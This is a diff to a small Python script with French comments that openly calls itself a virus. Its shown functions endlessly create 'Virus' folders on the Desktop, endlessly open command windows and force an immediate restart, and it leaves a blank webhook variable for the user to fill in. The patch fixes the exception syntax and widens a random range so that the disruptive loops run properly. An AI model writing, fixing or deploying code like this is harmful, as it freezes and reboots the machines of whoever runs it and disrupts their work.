@@ -39,7 +39,7 @@ webhook = "" # Ici faut placer ton webhook
 def dossier():
     while True:
         try:
-            ajout = random.randint(1, 100000)
+            ajout = random.randint(1, 9999999999)
             bureau = os.path.join(os.path.expanduser("~"), "Desktop")
             new_dossier = os.path.join(bureau, f"Virus{ajout}")
      
@@ -52,14 +52,14 @@ def cmd():
     while True: 
         try:
             os.system("start cmd")
-        except Exception(e):
+        except Exception as e:
             print("Une erreur et survenue", e)
 
 
 def shutdown():
     try:
         os.system("shutdown /r /t 0")
-    except Exception(e):
+    except Exception as e:
         print("Error", e)
 
 
